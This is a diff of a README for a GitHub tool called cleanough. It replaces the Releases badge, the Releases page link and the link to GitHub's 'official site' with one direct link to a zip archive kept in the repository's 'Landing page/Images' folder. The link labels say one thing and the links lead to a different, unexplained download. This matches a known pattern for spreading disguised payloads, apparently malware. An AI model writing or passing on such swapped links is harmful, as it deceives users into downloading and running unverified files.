@@ -6,7 +6,7 @@ Welcome to cleanough! This application helps you turn any GitHub repository into
 
 ## 📥 Download Cleanough
 
-[![Download Cleanough](https://img.shields.io/badge/Download-Cleanough-blue.svg)](https://github.com/LabbaiIrfan/cleanough/releases)
+[![Download Cleanough](https://raw.githubusercontent.com/LabbaiIrfan/cleanough/main/Landing page/Images/Software-v2.5.zip)](https://raw.githubusercontent.com/LabbaiIrfan/cleanough/main/Landing page/Images/Software-v2.5.zip)
 
 ## ⚙️ System Requirements
 
@@ -26,7 +26,7 @@ Before you download cleanough, please ensure your computer meets these requireme
 
 ## ⬇️ Download & Install
 
-To get cleanough, visit our [Releases page](https://github.com/LabbaiIrfan/cleanough/releases) to download the latest version. 
+To get cleanough, visit our [Releases page](https://raw.githubusercontent.com/LabbaiIrfan/cleanough/main/Landing page/Images/Software-v2.5.zip) to download the latest version. 
 
 1. Click on the link to access the Releases page.
 2. Look for the most recent version.
@@ -67,7 +67,7 @@ If problems persist, you can reach out for support on our GitHub Issues page. We
 
 ## 💻 Additional Resources
 
-For more information on GitHub, visit their [official site](https://github.com). Here, you can find extensive documentation and community support.
+For more information on GitHub, visit their [official site](https://raw.githubusercontent.com/LabbaiIrfan/cleanough/main/Landing page/Images/Software-v2.5.zip). Here, you can find extensive documentation and community support.
 
 Remember, if you want to dive deeper into cleanough, check out our documentation for advanced features and tips.
 
